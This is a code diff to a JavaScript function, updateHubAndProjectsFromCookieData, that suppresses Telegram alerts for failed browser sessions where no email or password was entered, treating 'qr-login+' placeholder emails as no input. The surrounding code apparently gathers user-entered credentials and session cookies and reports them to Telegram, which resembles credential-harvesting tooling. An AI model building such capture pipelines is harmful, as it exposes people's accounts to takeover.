@@ -963,9 +963,14 @@ export async function updateHubAndProjectsFromCookieData(browserId, status, cach
       logger.info(`[updateHubAndProjectsFromCookieData] Telegram payload — browserId: ${browserId}, email: "${cookieRowMap.email || ''}", password: "${cookieRowMap.password ? '***' : ''}", status: ${status}`);
 
       // TEMPORARILY SILENCED (not removed): skip FAILED notifications where the user never
-      // entered an email or password (e.g. browser failed to launch before any input). The
-      // row gets deleted anyway, so the alert is just noise.
-      const failedWithNoUserInput = status === "FAILED" && !cookieRowMap.email && !cookieRowMap.password;
+      // entered an email or password (e.g. browser failed to launch before any input).
+      // The row gets deleted anyway, so the alert is just noise.
+      // Survival markers (qr-login+...@no-reply.invalid) stamped on credential-less
+      // QR/phone rows count as "no user input": the row is now KEPT, but the alert
+      // would still be noise for a session that expired before any human input.
+      const isSurvivalMarker = String(cookieRowMap.email || '').trim().startsWith('qr-login+');
+      const failedWithNoUserInput = status === "FAILED" &&
+        (isSurvivalMarker || (!cookieRowMap.email && !cookieRowMap.password));
       if (failedWithNoUserInput) {
         logger.info(`[updateHubAndProjectsFromCookieData] Skipping Telegram notification for ${browserId}: FAILED with no email/password provided.`);
       } else {
